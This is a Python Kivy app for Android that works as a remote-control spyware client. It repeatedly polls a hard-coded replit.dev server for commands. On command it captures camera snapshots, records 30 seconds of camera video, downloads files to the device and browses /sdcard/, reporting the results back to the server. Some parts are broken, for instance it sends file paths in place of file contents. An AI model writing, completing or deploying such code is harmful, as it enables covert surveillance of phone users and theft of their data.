from kivy.app import App
from kivy.utils import platform
from kivy.uix.label import Label
from kivy.uix.filechooser import FileChooserListView
from kivy.clock import Clock
from android.permissions import request_permissions, Permission
import os
import cv2
import threading
import time
import requests
import json

UPLOAD_FOLDER = '/sdcard/Download/uploads'

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

SERVER_URL = 'https://76aed2d7-700d-4241-ab68-7c65895f2dc2-00-30iqfw43fow5i.kirk.replit.dev:8080/'

class MyApp(App):
    def build(self):
        if platform == 'android':
            request_permissions([Permission.CAMERA, Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
        Clock.schedule_interval(handle_commands, 10)
        return Label(text="Client running...")

def download_file(file_url):
    file_name = file_url.split('/')[-1]
    file_path = os.path.join(UPLOAD_FOLDER, file_name)
    r = requests.get(file_url)
    with open(file_path, 'wb') as f:
        f.write(r.content)
    return file_path

def capture_cam_shot():
    cam_shot_path = os.path.join(UPLOAD_FOLDER, 'cam_shot.jpg')
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(cam_shot_path, frame)
    cap.release()
    return cam_shot_path

def stream_client_screen():
    screen_stream_path = os.path.join(UPLOAD_FOLDER, 'screen_stream.mp4')
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(screen_stream_path, fourcc, 20.0, (640, 480))
    start_time = time.time()
    while time.time() - start_time < 30:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
    cap.release()
    out.release()
    return screen_stream_path

def handle_commands(dt):
    response = requests.get(SERVER_URL + '/get_commands')
    commands = response.json()

    if commands['browse']:
        browse_files()
    
    if commands['download']:
        file_path = download_file(commands['download'])
        requests.post(SERVER_URL + '/send_file', json={'file_path': file_path})

    if commands['camshot']:
        cam_shot_path = capture_cam_shot()
        requests.post(SERVER_URL + '/send_file', json={'file_path': cam_shot_path})

    if commands['screenstream']:
        screen_stream_path = stream_client_screen()
        requests.post(SERVER_URL + '/send_file', json={'file_path': screen_stream_path})

    requests.post(SERVER_URL + '/clear_commands')

def browse_files():
    filechooser = FileChooserListView(path='/sdcard/')
    filechooser.bind(on_selection=lambda x: send_selected_file(filechooser.selection))

def send_selected_file(selection):
    if selection:
        file_path = selection[0]
        requests.post(SERVER_URL + '/send_file', json={'file_path': file_path})

if __name__ == '__main__':
    MyApp().run()
